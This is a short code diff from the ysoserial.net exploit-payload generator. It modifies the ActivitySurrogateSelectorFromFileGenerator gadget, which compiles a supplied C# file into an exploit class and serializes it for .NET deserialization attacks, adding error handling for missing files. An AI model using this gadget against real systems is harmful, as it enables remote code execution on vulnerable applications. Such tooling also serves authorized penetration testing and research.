@@ -36,9 +36,9 @@ namespace ysoserial.Generators
     }
     class ActivitySurrogateSelectorFromFileGenerator : ActivitySurrogateSelectorGenerator
     {
-        public override string Description()
+        public override string AdditionalInfo()
         {
-            return "Another variant of the ActivitySurrogateSelector gadget. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., '-c ExploitClass.cs;System.Windows.Forms.dll'.";
+            return "Another variant of the ActivitySurrogateSelector gadget. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., '-c ExploitClass.cs;System.Windows.Forms.dll'";
         }
 
         public override string Name()
@@ -48,8 +48,17 @@ namespace ysoserial.Generators
         
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            PayloadClassFromFile payload = new PayloadClassFromFile(inputArgs.CmdRawNoEncoding);
-            return Serialize(payload, formatter, inputArgs);
+            try
+            {
+                PayloadClassFromFile payload = new PayloadClassFromFile(inputArgs.Cmd);
+                return Serialize(payload, formatter, inputArgs);
+            }
+            catch(System.IO.FileNotFoundException e1)
+            {
+                Console.WriteLine("Error in provided file(s): \r\n" + e1.Message);
+                return "";
+            }
+            
         }
     }
 }
